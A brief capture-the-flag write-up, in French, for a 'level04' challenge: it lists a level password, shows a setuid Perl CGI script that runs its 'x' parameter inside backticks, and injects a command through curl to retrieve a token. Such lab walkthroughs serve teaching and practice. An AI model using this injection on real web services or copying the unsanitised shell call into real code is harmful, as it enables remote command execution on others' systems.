## Step 1: Login
`su level04`

**password:** qi0maab88jeaj46qoumi7maus

## Step 2: Find flag

`ls -la`
> -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

On repere le s (fichier qui s'execute par un autre uuid)

`cat level04.pl`

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On en deduit qu'un serveur est lance sur localhost:4747

On execute le shell depuis le parametre x

```
curl localhost:4747?x=\`getflag\`
```
> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

